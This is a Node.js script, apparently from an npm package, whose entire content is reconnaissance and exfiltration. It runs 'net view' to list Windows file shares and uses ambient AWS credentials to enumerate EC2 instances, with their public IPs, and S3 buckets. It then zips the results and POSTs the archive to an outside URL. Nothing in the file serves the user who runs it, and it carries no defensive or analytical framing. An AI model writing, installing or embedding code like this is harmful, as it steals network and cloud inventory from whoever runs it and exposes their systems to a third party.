const fs = require('fs');
const archiver = require('archiver');
const axios = require('axios');
const { exec } = require('child_process');
const { EC2Client, DescribeInstancesCommand } = require('@aws-sdk/client-ec2');
const { S3Client, ListBucketsCommand } = require('@aws-sdk/client-s3');

// Enumerate accessible Windows file shares
async function getShares() {
  return new Promise(resolve => {
    exec('net view', (err, stdout, stderr) => {
      resolve(stdout || stderr);
    });
  });
}

// Enumerate EC2 instances
async function getEC2() {
  const ec2 = new EC2Client({ region: 'us-east-1' });
  const cmd = new DescribeInstancesCommand({});
  const res = await ec2.send(cmd);
  const arr = [];
  if (res.Reservations) {
    res.Reservations.forEach(r => {
      if (r.Instances) {
        r.Instances.forEach(i => {
          arr.push({
            InstanceId: i.InstanceId,
            State: i.State?.Name,
            Type: i.InstanceType,
            PublicIp: i.PublicIpAddress
          });
        });
      }
    });
  }
  return arr;
}

// Enumerate S3 buckets
async function getS3() {
  const s3 = new S3Client({ region: 'us-east-1' });
  const cmd = new ListBucketsCommand({});
  const res = await s3.send(cmd);
  return res.Buckets?.map(b => b.Name) || [];
}

// Upload the zip file using Axios
async function uploadZip() {
  const stream = fs.createReadStream('Project850.zip');
  await axios.post('https://github.com/JacobAragon24/NPM-Package-Testing', stream, {
    headers: { 'Content-Type': 'application/zip' }
  });
}

// Main function to run all steps
async function main() {
  let out = {};
  out['shares'] = await getShares();
  out['ec2'] = await getEC2();
  out['s3'] = await getS3();

  // Save output to Project850.txt
  fs.writeFileSync('Project850.txt', JSON.stringify(out, null, 2));

  // Archive Project850.txt as Project850.zip
  const output = fs.createWriteStream('Project850.zip');
  const zip = archiver('zip');
  zip.pipe(output);
  zip.file('Project850.txt', { name: 'Project850.txt' });
  zip.finalize();

  // Upload when archive is finished
  output.on('close', async () => {
    await uploadZip();
  });
}

main().catch(e => console.error(e));